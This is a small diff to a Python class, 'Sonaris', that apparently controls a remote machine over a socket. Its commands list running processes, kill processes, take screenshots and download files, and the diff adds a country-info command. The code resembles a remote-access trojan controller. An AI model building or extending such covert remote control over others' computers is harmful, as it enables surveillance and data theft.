@@ -23,7 +23,7 @@ class Sonaris(object):
         self._FullBufferSize = 65500
         self._CmdBufferSize = 16384
         self._HeaderBufferSize = 512
-        self.commands = "/commands\n/info\n/clear\n/getprocesslist\n/kill\n/screenshot\n/download\n/exit"
+        self.commands = "/commands\n/info\n/clear\n/getinfocountry\n/getprocesslist\n/kill\n/screenshot\n/download\n/exit"
 
     def CreateSocket(self):
         try:
@@ -35,7 +35,7 @@ class Sonaris(object):
         except Exception as e:
             print(colored(f'  [*] Error: Invalid adress {self.__Adress} {e}', 'red'))
             exit()
-    
+
     def GetProcessList(self, connection, command):
         connection.send(command.encode())
         try:
@@ -104,7 +104,7 @@ class Sonaris(object):
 
             print(colored(f'{int((len(screenshot)/header["numofbytes"])*100)}% {len(screenshot)} bytes received', 'yellow'), end='\r')
         '''
-        
+
         while(len(screenshot) <= header['numofbytes']):
             screenshot += connection.recv(header['numofbytes'])
             print(colored(f'{int((len(screenshot)/header["numofbytes"])*100)}% {len(screenshot)} bytes received', 'yellow'), end='\r')
